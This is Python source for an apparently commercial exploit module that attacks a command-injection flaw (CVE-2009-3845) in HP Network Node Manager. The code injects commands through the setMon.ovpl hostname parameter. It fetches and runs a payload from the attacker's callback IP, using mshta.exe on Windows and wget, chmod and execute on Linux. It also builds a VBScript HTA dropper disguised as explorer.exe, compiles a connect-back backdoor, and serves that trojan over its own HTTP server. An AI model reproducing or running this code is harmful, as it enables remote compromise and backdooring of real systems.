#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2009
#

import sys
import random
import time
import thread

if "." not in sys.path: 
	sys.path.append(".")

from exploitutils import *
from tcpexploit import tcpexploit
from libs.spkproxy import header, body
from libs.canvasos import *
import libs.spkproxy as spkproxy

import struct
import canvasengine

# GUI info
NAME = "HP Network Node Manager Command Injection Vulnerability"
DESCRIPTION = "Command injection vulnerability in HP Network Node Manager"
VERSION = "0.1"

DOCUMENTATION = {}
DOCUMENTATION["VENDOR"] = "HP"
DOCUMENTATION["Date public"] = "2009.12.09"
DOCUMENTATION["VersionsAffected"] = "HP Network Node Manager version 7.53"
DOCUMENTATION["CERT Advisory"] = ""
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-09-094/"
DOCUMENTATION["CVE Name"] = "CVE-2009-3845"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3845"
DOCUMENTATION["Notes"] = ""

GTK2_DIALOG = "dialog.glade2"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"], ["Linux"] ]

NOTES="""
Usage:
.\commandlineInterface.py -p 443 -v 1

-- Single command mode --
.\exploits\d2sec_hpnnm2\d2sec_hpnnm2.py -t 192.168.59.132 -l 192.168.1.1 -d 443 -O cmd:"ipconfig.exe"

-- Automatic MOSDEF trojan download and exec for Windows --
.\exploits\d2sec_hpnnm2\d2sec_hpnnm2.py -v 0 -t 192.168.59.132 -l 192.168.1.1 -d 443

-- Automatic MOSDEF trojan download and exec for Linux --
.\exploits\d2sec_hpnnm2\d2sec_hpnnm2.py -v 1 -t 192.168.59.132 -l 192.168.1.1 -d 443
"""

CHANGELOG="""
"""

targets = {    
	0: "Windows",
	1: "Linux",
}
	
class theexploit(tcpexploit):
	def __init__(self):
		tcpexploit.__init__(self)
		self.TROJANMODE = 0
		self.setInfo(DESCRIPTION)
		self.name = NAME       
		self.port = 80
		self.version = 0
		self.ssl = 0
		self.cmd = ""
		self.trojanname = "index.hta"
		return

	def file4hta(self, exename):
		evilprog = "explorer.exe"
		e = []
		
		for a in exename:
			for b in a:
				if b == "\r":
					d = "0d"
				elif b == "\n":
					d = "0a"
				elif b == "\0":
					d = "00"
				else:
					c = hex(ord(b))
					d = c.replace("0x", "")
		
				if len(d) == 1:
					d = "0"+d
		
				e.append(d)
		
		i = 0
		j = 0
		l = len(e)
		
		hta = "<SCRIPT language=vbs>\n\n"
		
		while 1:
			hta += " prog = prog & \""
		
			while i != 24:
				hta += "%s," % e[j]
				
				if j == l-1:
					break
					
				i += 1
				j += 1
		
			if j == l-1:
				hta = hta[:-1] + "\"\n\n"
				break
				
			hta += "\"\n"
			i = 0
		
		hta += " tmp = Split(prog, \",\")\n"	
		hta += " Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
		hta += " Set shell = CreateObject(\"WScript.Shell\")\n"
		hta += " userprofile = shell.ExpandEnvironmentStrings(\"%USERPROFILE%\")\n"
		hta += " path = userprofile & \"\\\" & \"%s\"\n" % evilprog
		hta += " Set f = fso.CreateTextFile(path, True)\n\n"
		hta += " For i = 0 To UBound(tmp)\n"
		hta += "   prog = Int(\"&H\" & tmp(i))\n"
		hta += "   f.Write Chr(prog)\n"
		hta += " Next\n\n"
		hta += " f.Close\n"
		hta += " shell.Run Chr(34) & path & Chr(34), 7, false\n"
		hta += " self.Close\n"
		hta += "</SCRIPT>\n"
		
		return hta
 
	def maketrojan(self):    	
		t_os = canvasos(targets[self.version])
		t_os.arch = "X86"
	    
		if self.version == 0:
			self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os = t_os)        
			self.log("Writing out %d bytes to %s"%(len(self.mosdeftrojan), self.trojanname))        
			self.htafile = self.file4hta(self.mosdeftrojan)
			file(self.trojanname, "wb").write(self.htafile)
			self.setInfo("%s - done"%(NAME))
			ret = len(self.mosdeftrojan) != 0	
		else:
			from MOSDEF import makeexe
			from MOSDEF.cc import threadsafe_cc_main
			
			self.log("[!] Compiling Unix trojan")
			infilename = "backdoors/cback_mmap_rwx.c"
			vars = {}
			vars['CBACK_PORT'] = self.callback.port
			vars['CBACK_ADDR'] = str2int32(socket.inet_aton(self.callback.ip))
			self.log("[!] Callback address is %s"%vars['CBACK_ADDR'])
			cc_command = []
			
			for var in vars:
				cc_command += ["-D","%s=%s"%(var,vars[var])]
				
			cc_command += ["-d", "-v","-m","Linux" ,"-p", "i386","-k", "None", infilename]
			self.log("[!] CC command: %s"%cc_command)
			mosdeftrojan = threadsafe_cc_main(cc_command)
			
			if not mosdeftrojan:
				self.log("[X] Was unable to create trojan!")
				return ""
			
			self.log("[!] Length of CC compiled trojan: %s"% len(mosdeftrojan))
			self.log("[!] Writing out %d bytes to %s"%(len(mosdeftrojan), self.trojanname))        
			file(self.trojanname, "wb").write(mosdeftrojan)
			ret = len(mosdeftrojan) != 0
	
		return ret

	def makesploit(self, clientheader, clientbody):        
		from libs.spkproxy import header, body
		h = header('SERVER')
		b = body()
		
		self.maketrojan()
		        
		if clientheader.URL.count(self.trojanname):
			self.log("Sending MOSDEF trojan")
			f = open(self.trojanname, "rb")
			sploitstring = f.read()
			f.close()
			os.remove(self.trojanname)
			self.log("Sending %d bytes"%len(sploitstring))
			h.addHeader("Content-type","binary/octet-stream")
			h.addHeader("Connection","close")
			b.setBody(sploitstring)
		
		return h, b

	def neededListenerTypes(self):
		from canvasengine import WIN32MOSDEF
		return [WIN32MOSDEF]

	#################################################################################################################
	# Code from httpserver.py
	def listen(self):
		self.getargs()
		s=self.gettcplistener(80, "0.0.0.0")
		
		if not s:
			if self.port < 1024:
			    self.log("Cannot listen on port %d - perhaps we need to be root or that port is already bound? " \
			             "you can try to bind to a higher port" % self.port)
			else:
			    self.log("Cannot listen on port %d - perhaps that port is already bound?" % self.port)
			return 0
		s.set_timeout(5)
		self.s=s
		return s 
	
	def accept(self, s=None ):
		"""
		Try to accept one connection
		returns true if we found one
		"""
		#we loop on this ,so no annoying printouts here
		#self.log("Accepting connection")
		if s==None:
			s=self.s 
		try:
			infd,addr=s.accept()
		except timeoutsocket.Timeout:
			#self.log("Timed out - no accept yet")
			return 
		if infd==-1:
			return
		
		#else we have an infd
		self.handle(infd)
		return True #handled connection
	    
	def handle(self, infd): 
		self.log("Handling connection")
		clientheader = header(state = "SERVER")
		clientheader.ssl = self.ssl
		ret = clientheader.readdata(infd)
		clientbody = body()
		
		if clientheader.gotGoodHeader():
			if clientheader.bodySize()>0 or clientheader.wasChunked:
				self.log("Reading body")
				clientbody.read(infd, clientheader.bodySize(), clientheader.wasChunked, 0)
				self.log("Read body")
		
		self.log("Creating exploit response")		
		servheader,servbody = self.makesploit(clientheader,clientbody)
				
		self.log("Responding")		
		bodydata = "".join(servbody.data)		            		
		response = ""
		response += "%s %s %s\r\n"%(servheader.version, servheader.status, servheader.msg)		
		self.log(response)
		
		for akey in servheader.headerValuesDict.keys():
			if akey not in [ "Content-Length", "Content-length"]:
				response += servheader.grabHeader(akey)
				
		self.log("Sending header data of %d bytes"%len(response))
		chunked = 0
		
		if not chunked:
			response += "Content-Length: "+str(len(bodydata))+"\r\n"
			
		response += "\r\n"
		response += "".join(bodydata)
		self.log("Total response length is %d bytes"%len(response))
		
		try:
			infd.sendall(response)
		except socket.error:
			self.log("Connection closed by peer")
			
		self.log("Response sent")
		infd.close() #connection close - later on we'll keep it.
		return 
	#
	#################################################################################################################
        
	def startHTTPServer(self):
		s = self.listen()
		
		if not s:
			self.log("Failed to listen - not running")
			return 0
			
		while 1:
			if self.state==self.HALT:
				self.s.close()
				break
			self.accept()
		
		self.setInfo("%s on %s:%d - done (success!)"%(NAME, self.bindip, self.port))		
		return 1
    	        
	def run(self):
		data_1 = ''
		data_2 = ''	
		buff = ''
		
		# Check arguments
		self.host = self.target.interface
		self.port = int(self.argsDict.get("port", self.port))
		
		print "self.version: %d" % self.version
		        
		if (self.argsDict.get("cmd", self.cmd) == ""):
			self.TROJANMODE = 1
			if self.version == 0:
				self.cmd = "mshta.exe http://" + self.callback.ip + "/" + self.trojanname
			else:
				self.cmd = "wget -O /tmp/" + self.trojanname + " http://" + self.callback.ip + "/" + self.trojanname + "; chmod +x /tmp/" + self.trojanname + "; /tmp/" + self.trojanname
			thread.start_new_thread(self.startHTTPServer,())
		else:
			self.cmd = self.argsDict.get("cmd", self.cmd)
			               
		self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))                
		self.log("Attacking %s:%d"%(self.host, self.port))                

		self.cmd = self.cmd.replace(' ', '%20')
		
		sploitstring = "/OvCgi/ifaceMgr/setMon.ovpl?Action=continue&hostname=d2|%s" % self.cmd
		mainurl = "http://%s:%d%s" % (self.host, self.port, sploitstring)
		handle = spkproxy.urlopen(mainurl, exploit=self, extraheaders=[("User-Agent","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)")])
		data = handle.read()

		if (self.TROJANMODE == 1):
			while 1:
				time.sleep(1)			
		          
		self.setInfo('[D2] %s attacking %s:%d - done' % (NAME, self.host, self.port))
						            
		return 1            
       
			  		
	def usage(self):        
		print "Usage: %s -v version -t targethost -l localip -d localport [-O cmd:command]\n" % sys.argv[0]
		
		i = 0
		
		print 'Available versions:'
		
		for listline in targets.values():
			print '\t%d: %s'%(i, listline[0])
			i = i + 1
		
		sys.exit(0) 

if __name__ == '__main__':
	print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
	app = theexploit()
	ret = standard_callback_commandline(app)
